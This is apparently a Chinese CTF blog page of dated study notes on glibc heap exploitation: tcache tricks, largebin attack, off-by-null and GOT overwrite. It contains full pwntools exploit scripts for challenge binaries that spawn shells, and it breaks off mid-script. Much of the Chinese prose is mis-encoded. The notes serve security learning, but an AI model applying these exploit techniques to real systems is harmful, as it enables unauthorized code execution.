<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  
    <title>
      
        tonight |
          
            (*â•¹â–½â•¹*)
    </title>
    <!-- ä¸»css -->
    
<link rel="stylesheet" href="/sass/main.css">

      <!-- seo -->
      <meta name="description" content="4.8 é€šè¿‡ä¸€å­—èŠ‚ä¿®æ”¹mp_.tcache_binsï¼Œæ”¹å¤§ï¼Œå¹¶ä¸”æŠŠå­˜æ”¾åœ¨å †ç©ºé—´ä¸Šçš„tcache structå†…å®¹(ä¸€èˆ¬åœ¨top chunk)ä¿®æ”¹ä¸ºç›®æ ‡åœ°å€ï¼Œé‚£åœ¨è°ƒç”¨tcache_getæ ¹æ®tc_idxç´¢å¼•å–å †å—æ—¶å°±ä¼šè¶…è¿‡åŸæ¥çš„èŒƒå›´å‘ä¸‹å–å †å—ï¼Œå‡è®¾entries[tc_idx]æ°å¥½åˆä¸ä¸º0æ­¤ä¼¼ä¹ä¾¿ä¼šå°†èµ·è¿”å›ï¼Œä»è€Œç”³è¯·åˆ°ç›®æ ‡åœ°å€  VNCTF2021 LittleRedFlower  ä½†æ˜¯è¿™ä¸ªtcac">
<meta property="og:type" content="article">
<meta property="og:title" content="tonight">
<meta property="og:url" content="https://brooke-hub.github.io/2021/04/21/tonight/index.html">
<meta property="og:site_name" content="(*â•¹â–½â•¹*)">
<meta property="og:description" content="4.8 é€šè¿‡ä¸€å­—èŠ‚ä¿®æ”¹mp_.tcache_binsï¼Œæ”¹å¤§ï¼Œå¹¶ä¸”æŠŠå­˜æ”¾åœ¨å †ç©ºé—´ä¸Šçš„tcache structå†…å®¹(ä¸€èˆ¬åœ¨top chunk)ä¿®æ”¹ä¸ºç›®æ ‡åœ°å€ï¼Œé‚£åœ¨è°ƒç”¨tcache_getæ ¹æ®tc_idxç´¢å¼•å–å †å—æ—¶å°±ä¼šè¶…è¿‡åŸæ¥çš„èŒƒå›´å‘ä¸‹å–å †å—ï¼Œå‡è®¾entries[tc_idx]æ°å¥½åˆä¸ä¸º0æ­¤ä¼¼ä¹ä¾¿ä¼šå°†èµ·è¿”å›ï¼Œä»è€Œç”³è¯·åˆ°ç›®æ ‡åœ°å€  VNCTF2021 LittleRedFlower  ä½†æ˜¯è¿™ä¸ªtcac">
<meta property="og:locale">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/1144313/1617852067326-b466d25c-efb4-4d9e-95da-a11680d56e18.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/1144313/1617871158045-9cb9392b-2e35-4bea-8c7a-e79372c4cd11.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618477908665-fcf16d88-1ea8-44ec-a82e-5c3fd77e3b4e.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618479134070-27cc4ebb-79e2-468f-8ee1-f6585f092557.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618488882443-55d39820-d87c-456a-a930-0bf1ca9724f7.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618489162188-e1230e99-83b1-4631-a682-3fae3f4870ad.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618489550470-d97a4b64-5915-4b98-9393-1b815a69da01.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/1144313/1618993139811-95019e88-fa9a-479f-92a6-363d6e16c1dd.png">
<meta property="article:published_time" content="2021-04-21T12:15:47.000Z">
<meta property="article:modified_time" content="2021-04-21T12:51:50.842Z">
<meta property="article:author" content="WendyJellyBeans">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2021/png/1144313/1617852067326-b466d25c-efb4-4d9e-95da-a11680d56e18.png">
        <!-- facicon -->
        
          <link rel="icon" href="http://7xp1k3.com1.z0.glb.clouddn.com/octocat-de-los-muertos.jpg">
          
            <!-- ç»Ÿè®¡ -->
            
              <script>
                var _hmt = _hmt || [];
                (function () {
                  var hm = document.createElement("script");
                  hm.src = "//hm.baidu.com/hm.js?c21994907883f37ffd80e13627dd4faa";
                  var s = document.getElementsByTagName("script")[0];
                  s.parentNode.insertBefore(hm, s);
                })();
              </script>
              
                
                    <script src="http://cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="(*â•¹â–½â•¹*)" type="application/atom+xml">
</head>
	<body>
		<div class="main">
			<div id="mobile-bar">
    <a class="menu-button"></a>
    <a class="logo" href="/">(*â•¹â–½â•¹*)</a>
</div>
<header class="nav-header">
    <a href="/" class="logo-link">(*â•¹â–½â•¹*)</a>
    
            
    <ul class="nav nav-list">
        <li class="nav-list-item"><a href="/">Home</a></li>
        
            
        
            
        <li class="nav-list-item"><a href="/about">About</a></li>
            
        
            
        <li class="nav-list-item"><a href="/tags">Tags</a></li>
            
        
            
        <li class="nav-list-item"><a href="/archives">Archives</a></li>
            
        
    </ul>
</header>
<div class="sidebar">
    
            
    <ul class="main-menu">
        <li class="main-menu-item"><a href="/">Home</a></li>
        
            
        
            
        <li class="main-menu-item"><a href="/about">About</a></li>
            
        
            
        <li class="main-menu-item"><a href="/tags">Tags</a></li>
            
        
            
        <li class="main-menu-item"><a href="/archives">Archives</a></li>
            
        
    </ul>
</div>

<h1 class="blog-title">The (*â•¹â–½â•¹*) Blog</h1>

			
<article class="article-main" itemscope itemprop="blogPost">
        <div class="articleCon">
            <header class="article-header">
                <h1 itemprop="name">
                    <a href="/2021/04/21/tonight/" class="article-title">tonight</a>
                </h1>
            </header>
            
<div class="bookmark" id="bookmark">
    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-8"><span class="toc-text">4.8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-10"><span class="toc-text">4.10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-11"><span class="toc-text">4.11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-12"><span class="toc-text">4.12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-13"><span class="toc-text">4.13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-14"><span class="toc-text">4.14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-15"><span class="toc-text">4.15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-16"><span class="toc-text">4.16</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-17"><span class="toc-text">4.17</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-18"><span class="toc-text">4.18</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-21"><span class="toc-text">4.21</span></a></li></ol>
</div>

            
            <div class="article-meta">
                <div class="article-dateTime">
    <a href="/2021/04/21/tonight/" class="article-date">
        <time datetime="Apr 21st 2021" itemprop="datePublished">
            Apr 21st 2021
        </time>
    </a>
</div>

            </div>
            <div class="article-inner">
                <div class="article-entry" itemprop="articleBody">
                    <h3 id="4-8"><a href="#4-8" class="headerlink" title="4.8"></a>4.8</h3><ul>
<li>é€šè¿‡ä¸€å­—èŠ‚ä¿®æ”¹mp_.tcache_binsï¼Œæ”¹å¤§ï¼Œå¹¶ä¸”æŠŠå­˜æ”¾åœ¨å †ç©ºé—´ä¸Šçš„tcache structå†…å®¹(ä¸€èˆ¬åœ¨top chunk)ä¿®æ”¹ä¸ºç›®æ ‡åœ°å€ï¼Œé‚£åœ¨è°ƒç”¨tcache_get<strong>æ ¹æ®tc_idxç´¢å¼•</strong>å–å †å—æ—¶å°±ä¼šè¶…è¿‡åŸæ¥çš„èŒƒå›´å‘ä¸‹å–å †å—ï¼Œå‡è®¾entries[tc_idx]æ°å¥½åˆä¸ä¸º0æ­¤ä¼¼ä¹ä¾¿ä¼šå°†èµ·è¿”å›ï¼Œä»è€Œç”³è¯·åˆ°ç›®æ ‡åœ°å€</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/xoc9LeME2fmIoWLM7IzTrw">VNCTF2021 LittleRedFlower</a></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1617852067326-b466d25c-efb4-4d9e-95da-a11680d56e18.png" alt="img"></p>
<p>ä½†æ˜¯è¿™ä¸ªtcache structä¸­entriesæ•°ç»„å¯¹åº”çš„idxï¼Œè¦å’Œç”³è¯·çš„sizeç›¸å¯¹åº”ï¼Œæš‚æ—¶è¿˜ä¸çŸ¥é“æ€ä¹ˆç¡®å®šåç§»ğŸ˜­</p>
<ul>
<li><p>2.32å¯¹tcacheæ–°å¢çš„ä¿æŠ¤</p>
</li>
<li><p>fdæ˜¯(chunk_addr &gt;&gt; 12)^(tcache-&gt;entries)  </p>
</li>
<li><p>é‚£ä¹ˆç¬¬ä¸€ä¸ªtcache chunkçš„fd å°±æ˜¯(chunk_addr &gt;&gt; 12)^0 (æ³„éœ²å‡ºæ¥å†&lt;&lt;12å°±æ˜¯heap_baseå•¦)</p>
</li>
<li><p>ä¹‹å‰tcache attackæ˜¯ç›´æ¥æŠŠfdæ”¹ä¸º<code>ç›®æ ‡åœ°å€</code>å³å¯ï¼Œç°åœ¨æŠŠfdæ”¹ä¸º<code>(chunk_addr &gt;&gt; 12)^ç›®æ ‡åœ°å€</code>å°±å¯ä»¥å•¦</p>
</li>
<li><p>ç›´æ¥æ‰“åˆ°tcache_perthread_structï¼Œå¡«0x290çš„countä¸º7ï¼Œfree è¯¥chunkå°±è¿›å…¥äº†unosrtedbinï¼</p>
</li>
<li><p>ä¹‹åæŠŠunosrtedbin addrè¸©åˆ°tcacheçš„æŒ‡é’ˆå¤„ï¼Œçˆ†ç ´ä¸€ä½ï¼Œç”³è¯·åˆ°_IO_2_1_stdout_</p>
</li>
<li><p>å¾—åˆ°libcä¹‹åæ¥ç€æ”¹tcacheæŒ‡é’ˆ</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/1OzuKnQK2wNxhHYObN3UYA">VNCTF2021 ff</a></p>
</li>
</ul>
<ul>
<li>vmpwnå¥½ç£¨äººğŸ˜­å±è‚¡éƒ½åç—›äº†</li>
</ul>
<ul>
<li><p>pwntools å¯ä»¥ä½¿ç”¨ <code>shutdown_raw(direction=&#39;send&#39;)</code> å…³é—­ç®¡é“çš„ send æ–¹å‘ï¼Œä½¿è¿œç¨‹ <code>read()</code> è¯»åˆ° EOFï¼Œè¿”å› 0</p>
</li>
<li><p>æ•°ç»„-1è¶Šç•Œï¼Œçˆ†ç ´ï¼Œå¦‚æœç¨‹åºä»»æ„ç”³è¯·åˆ°äº†flagé™„è¿‘çš„chunkï¼Œå¯ç›´æ¥æ³„éœ²flag</p>
</li>
</ul>
<ul>
<li><img src="https://cdn.nlark.com/yuque/0/2021/png/1144313/1617871158045-9cb9392b-2e35-4bea-8c7a-e79372c4cd11.png" alt="img"></li>
</ul>
<h3 id="4-10"><a href="#4-10" class="headerlink" title="4.10"></a>4.10</h3><ul>
<li><p>huxiangbei_2019_namesystem </p>
</li>
<li><p>åˆ é™¤chunkæ—¶å…¨å±€æ•°ç»„indexæ¼äº†å¤„ç†æœ€åä¸€ä½ï¼ŒæŒ‡é’ˆæ‚¬ç©º</p>
</li>
<li><p>æ²¡æœ‰showåŠŸèƒ½ä½†æ˜¯å¯ä»¥æ”¹free@gotä¸ºprintf@pltï¼Œåœ¨ä¸€ä¸ªchunkä¸­å†™å…¥fmtï¼Œå¯¹æ ˆè¿›è¡Œæ³„æ¼ï¼Œå¾—åˆ°libc</p>
</li>
<li><p>è¦æå‰å¸ƒç½®å¥½ä¸¤ä¸ªdouble freeï¼Œå› ä¸ºæ”¹å®Œfree@gotå°±ä¸èƒ½æ­£å¸¸ç”¨freeäº†</p>
</li>
</ul>
<h3 id="4-11"><a href="#4-11" class="headerlink" title="4.11"></a>4.11</h3><h3 id="4-12"><a href="#4-12" class="headerlink" title="4.12"></a>4.12</h3><h3 id="4-13"><a href="#4-13" class="headerlink" title="4.13"></a>4.13</h3><p>2019è¥¿æ¹–è®ºå‰‘é¢„é€‰</p>
<p><strong>story</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">binary&#x3D;&#39;.&#x2F;story&#39;</span><br><span class="line">sh&#x3D;process(binary)</span><br><span class="line"># sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29146)</span><br><span class="line">elf&#x3D;ELF(binary)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">context.arch&#x3D;&#39;amd64&#39;</span><br><span class="line">libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"># libc&#x3D;ELF(&#39;libc-2.23.so&#39;)</span><br><span class="line"></span><br><span class="line">sa &#x3D; lambda s,n : sh.sendafter(s,n)</span><br><span class="line">sla &#x3D; lambda s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl &#x3D; lambda s : sh.sendline(s)</span><br><span class="line">sd &#x3D; lambda s : sh.send(s)</span><br><span class="line">rc &#x3D; lambda n : sh.recv(n)</span><br><span class="line">ru &#x3D; lambda s : sh.recvuntil(s)</span><br><span class="line">ti &#x3D; lambda : sh.interactive()</span><br><span class="line">leak &#x3D; lambda name,addr :log.success(name+&quot;:&quot;+hex(addr))</span><br><span class="line"></span><br><span class="line">sla(&#39;Your ID:&#39;,&#39;%15$p.%25$p&#39;)</span><br><span class="line">sh.recvuntil(&#39;0x&#39;)</span><br><span class="line">canary&#x3D;int(sh.recvuntil(&#39;.&#39;,drop&#x3D;True),16)</span><br><span class="line">leak(&#39;canary&#39;,canary)</span><br><span class="line">sh.recvuntil(&#39;0x&#39;)</span><br><span class="line">libc_base &#x3D;int(sh.recvuntil(&#39;\n&#39;,drop&#x3D;True),16) - libc.sym[&#39;__libc_start_main&#39;] - 240</span><br><span class="line">leak(&#39;libc_base&#39;,libc_base) </span><br><span class="line"></span><br><span class="line">sla(&#39;the size of your story:&#39;,str(0x400))</span><br><span class="line">pop_rdi&#x3D;0x0000000000400bd3</span><br><span class="line">binsh_addr&#x3D;libc_base+libc.search(&#39;&#x2F;bin&#x2F;sh\x00&#39;).next()</span><br><span class="line">system&#x3D;libc_base+libc.sym[&#39;system&#39;]</span><br><span class="line"># pause()</span><br><span class="line">sla(&#39;story:&#39;,&#39;a&#39;*(0x90-0x8)+p64(canary)+&#39;a&#39;*8+p64(pop_rdi)+p64(binsh_addr)+p64(system))</span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>

<h3 id="4-14"><a href="#4-14" class="headerlink" title="4.14"></a>4.14</h3><p><strong>noinfoleak</strong></p>
<p>å…¨å±€æŒ‡é’ˆä¸Šé¢çš„stdinå†…å®¹å¯ä»¥ä¼ªé€ chunk size</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">binary&#x3D;&#39;.&#x2F;noinfoleak&#39;</span><br><span class="line">sh&#x3D;process(binary)</span><br><span class="line"># sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29146)</span><br><span class="line">elf&#x3D;ELF(binary)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">context.arch&#x3D;&#39;amd64&#39;</span><br><span class="line">libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"># libc&#x3D;ELF(&#39;libc-2.23.so&#39;)</span><br><span class="line"></span><br><span class="line">sa &#x3D; lambda s,n : sh.sendafter(s,n)</span><br><span class="line">sla &#x3D; lambda s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl &#x3D; lambda s : sh.sendline(s)</span><br><span class="line">sd &#x3D; lambda s : sh.send(s)</span><br><span class="line">rc &#x3D; lambda n : sh.recv(n)</span><br><span class="line">ru &#x3D; lambda s : sh.recvuntil(s)</span><br><span class="line">ti &#x3D; lambda : sh.interactive()</span><br><span class="line">leak &#x3D; lambda name,addr :log.success(name+&quot;:&quot;+hex(addr))</span><br><span class="line">def leaklibc():</span><br><span class="line">    global libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_,_IO_list_all</span><br><span class="line">    libc_base &#x3D; u64(sh.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;)) - libc.sym[&#39;atoi&#39;]</span><br><span class="line">    success(&#39;libc_base &#x3D; &#39;+hex(libc_base))</span><br><span class="line">    __malloc_hook&#x3D;libc_base+libc.sym[&#39;__malloc_hook&#39;]</span><br><span class="line">    __free_hook&#x3D;libc_base+libc.sym[&#39;__free_hook&#39;]</span><br><span class="line">    system&#x3D;libc_base+libc.sym[&#39;system&#39;]</span><br><span class="line">def add(size,content):</span><br><span class="line">	sla(&#39;&gt;&#39;,&#39;1&#39;)</span><br><span class="line">	sla(&#39;&gt;&#39;,str(size))</span><br><span class="line">	sa(&#39;&gt;&#39;,content)</span><br><span class="line">def dele(index):</span><br><span class="line">	sla(&#39;&gt;&#39;,&#39;2&#39;)</span><br><span class="line">	sla(&#39;&gt;&#39;,str(index))</span><br><span class="line">def edit(index,content):</span><br><span class="line">	sla(&#39;&gt;&#39;,&#39;3&#39;)</span><br><span class="line">	sla(&#39;&gt;&#39;,str(index))</span><br><span class="line">	sa(&#39;&gt;&#39;,content)</span><br><span class="line"></span><br><span class="line">chunk_list&#x3D;0x0000000006010A0</span><br><span class="line">add(0x60,&#39;a\n&#39;)#0</span><br><span class="line">add(0x60,&#39;a\n&#39;)#1</span><br><span class="line">dele(0)</span><br><span class="line">edit(0,p64(chunk_list-0x13)+&#39;\n&#39;)</span><br><span class="line">add(0x60,&#39;a\n&#39;)#2</span><br><span class="line">add(0x60,&#39;b&#39;*0x3+p64(elf.got[&#39;free&#39;])+p64(0x60)+p64(elf.got[&#39;atoi&#39;])+p64(0x60)+&#39;\n&#39;)#3</span><br><span class="line"></span><br><span class="line"># add(0x50,&#39;a\n&#39;)#4</span><br><span class="line">edit(0,p64(elf.plt[&#39;puts&#39;]))</span><br><span class="line">dele(1)</span><br><span class="line">leaklibc()</span><br><span class="line"></span><br><span class="line">edit(1,p64(system))</span><br><span class="line">sla(&#39;&gt;&#39;,&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>

<p><strong>Note_Storm</strong></p>
<p>libc2.23</p>
<p>largebin attack</p>
<p>ç¦ç”¨äº†fastbinï¼Œsizeå¯ä»¥å¾ˆå¤§ï¼Œç”³è¯·åˆ°0xABCD0100ä»»æ„å†™å°±å¯ä»¥ç»•è¿‡æ£€æŸ¥</p>
<p>æœ‰off by nullæ„é€ chunk overlap</p>
<p>è®¾ç½®fake pre size</p>
<p>dele ä¸€ä¸ªå¤§chunk0ï¼Œå˜æˆunsortedchunk</p>
<p>off by nullä¿®æ”¹unsortedchunk çš„ pre inuseï¼Œå¹¶æ”¹å°size</p>
<p>åˆ‡å‰²åˆ†é…unsortedchunkä¸ºä¸€ä¸ªå°chunkå’Œä¸€ä¸ªå¤§chunk1ï¼ˆè¦ç»•è¿‡sizeå’Œå¯¹åº”pre sizeçš„æ£€æŸ¥ï¼Œè¿™æ˜¯å‰é¢è®¾ç½®çš„fake pre sizeçš„ä½œç”¨ï¼‰</p>
<p>dele å°chunk</p>
<p>å†deleæœ€å¼€å§‹é‚£ä¸ªå¤§chunk0åé¢çš„chunkï¼Œç”±äºå®ƒçš„pre sizeè¿˜ä¿å­˜ç€æœ€å¼€å§‹é‚£ä¸ªå¤§chunk0çš„sizeï¼Œå®ƒä¼šç›´æ¥å…¨éƒ¨åˆå¹¶ï¼Œè¿™é‡Œé¢å°±åŒ…æ‹¬äº†è¿˜æœªè¢«freeçš„å¤§chunk1</p>
<p>åˆ‡å‰²åˆ†é…unsortedchunkä¸ºä¸€ä¸ªå°chunkå’Œä¸€ä¸ªå¤§chunk2ï¼Œå°±å®ç°ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€å—å†…å®¹</p>
<p>ä¿®æ”¹unsortedbin</p>
<p> <code>bk</code>ä¸º <code>fake chunkï¼ˆ``0xABCD0100 -0x20``ï¼‰</code></p>
<p>ä¿®æ”¹largebinï¼ˆä»unsortedbinç”³è¯·ä¸€ä¸ªchunkï¼Œä¼šæŠŠå‰©ä½™chunkæ”¾å…¥largebinï¼‰</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bk&#96;ä¸º &#96;fake_chunk+8</span><br><span class="line">bk-&gt;nextsize&#96;ä¸º &#96;fake_chunk-0x18-5</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">binary&#x3D;&#39;.&#x2F;Storm_note&#39;</span><br><span class="line">sh&#x3D;process(binary)</span><br><span class="line"># sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,29146)</span><br><span class="line">elf&#x3D;ELF(binary)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">context.arch&#x3D;&#39;amd64&#39;</span><br><span class="line">libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"># libc&#x3D;ELF(&#39;libc-2.23.so&#39;)</span><br><span class="line"></span><br><span class="line">sa &#x3D; lambda s,n : sh.sendafter(s,n)</span><br><span class="line">sla &#x3D; lambda s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl &#x3D; lambda s : sh.sendline(s)</span><br><span class="line">sd &#x3D; lambda s : sh.send(s)</span><br><span class="line">rc &#x3D; lambda n : sh.recv(n)</span><br><span class="line">ru &#x3D; lambda s : sh.recvuntil(s)</span><br><span class="line">ti &#x3D; lambda : sh.interactive()</span><br><span class="line">leak &#x3D; lambda name,addr :log.success(name+&quot;:&quot;+hex(addr))</span><br><span class="line">def leaklibc():</span><br><span class="line">    global libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_,_IO_list_all</span><br><span class="line">    libc_base &#x3D; u64(sh.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;)) - libc.sym[&#39;atoi&#39;]</span><br><span class="line">    success(&#39;libc_base &#x3D; &#39;+hex(libc_base))</span><br><span class="line">    __malloc_hook&#x3D;libc_base+libc.sym[&#39;__malloc_hook&#39;]</span><br><span class="line">    __free_hook&#x3D;libc_base+libc.sym[&#39;__free_hook&#39;]</span><br><span class="line">    system&#x3D;libc_base+libc.sym[&#39;system&#39;]</span><br><span class="line">def cmd(index):</span><br><span class="line">	sla(&#39;Choice: &#39;,str(index))</span><br><span class="line">def add(size):</span><br><span class="line">	cmd(1)</span><br><span class="line">	sla(&#39;size ?&#39;,str(size))</span><br><span class="line">	# sa(&#39;&gt;&#39;,content)</span><br><span class="line">def dele(index):</span><br><span class="line">	cmd(3)</span><br><span class="line">	sla(&#39;Index ?&#39;,str(index))</span><br><span class="line">def edit(index,content):</span><br><span class="line">	cmd(2)</span><br><span class="line">	sla(&#39;Index ?&#39;,str(index))</span><br><span class="line">	sa(&#39;Content:&#39;,content)</span><br><span class="line">def backdoor(buff):</span><br><span class="line">	cmd(666)</span><br><span class="line">	sa(&#39;let you in&#39;,buff)</span><br><span class="line"></span><br><span class="line">add(0x18)     #0</span><br><span class="line">add(0x508)    #1</span><br><span class="line">add(0x18)     #2</span><br><span class="line">edit(1, &#39;h&#39;*0x4f0 + p64(0x500))   #set fake prev_size</span><br><span class="line"></span><br><span class="line">add(0x18)     #3</span><br><span class="line">add(0x508)    #4</span><br><span class="line">add(0x18)     #5</span><br><span class="line">edit(4, &#39;h&#39;*0x4f0 + p64(0x500))   #set fake prev_size</span><br><span class="line">add(0x18)     #6</span><br><span class="line"></span><br><span class="line"># &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">dele(1)</span><br><span class="line">edit(0, &#39;h&#39;*(0x18))    #off-by-one chunk1 0x510-&gt;0x500</span><br><span class="line">add(0x18)     #1</span><br><span class="line">add(0x4d8)    #7</span><br><span class="line">dele(1)</span><br><span class="line">dele(2)         #backward consolidate</span><br><span class="line">add(0x38)     #1</span><br><span class="line">add(0x4e8)    #2</span><br><span class="line"></span><br><span class="line">dele(4)</span><br><span class="line">edit(3, &#39;h&#39;*(0x18))    #off-by-one</span><br><span class="line">add(0x18)     #4</span><br><span class="line">add(0x4d8)    #8</span><br><span class="line">dele(4)</span><br><span 